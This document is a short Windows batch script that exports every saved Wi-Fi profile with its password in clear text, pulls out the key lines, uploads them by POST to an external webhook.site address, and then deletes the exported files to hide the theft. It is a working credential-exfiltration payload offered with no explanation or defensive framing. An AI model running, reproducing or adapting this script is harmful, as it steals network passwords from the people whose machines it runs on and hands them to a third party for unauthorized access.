@echo off
netsh wlan export profile key=clear
timeout /t 2
powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
timeout /t 2
powershell Invoke-WebRequest -Uri https://webhook.site/577ff0d6-9637-41d3-acdf-b67f305db735 -Method POST -InFile WiFi-Key
timeout /t 2
del Wi* /s/f/q